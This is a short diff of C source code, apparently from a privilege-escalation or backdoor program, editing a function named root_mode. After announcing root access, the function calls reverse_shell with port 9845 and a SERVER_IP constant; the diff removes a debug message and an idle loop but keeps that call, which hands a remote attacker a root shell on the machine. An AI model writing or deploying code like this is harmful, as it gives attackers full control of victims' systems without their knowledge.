@@ -52,12 +52,7 @@ int sudo_mode(int argc, char ** argv){
 }
 
 int root_mode(int argc, char**argv){
-  printf("I have root acess now...\n");
   reverse_shell(9845, SERVER_IP, argv);
-  while(1){
-    sleep(1);
-    printf("...\n");
-  }
 }
 
 int set_mode(int argc, char**argv){
